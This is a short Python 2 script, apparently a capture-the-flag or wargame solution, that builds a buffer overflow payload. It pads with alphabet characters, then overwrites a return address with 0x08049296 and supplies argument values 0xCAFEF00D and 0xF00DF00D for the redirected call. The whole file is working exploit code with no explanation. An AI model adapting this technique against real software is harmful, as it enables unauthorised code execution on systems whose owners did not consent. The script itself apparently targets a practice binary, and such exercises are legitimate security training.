#!/usr/bin/env python2

import struct

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
payload += "aaaabbbb"
payload += struct.pack("I",0x08049296)
payload += struct.pack("I",0x00000000)
payload += struct.pack("I",0xCAFEF00D)
payload += struct.pack("I",0xF00DF00D)
print(payload)
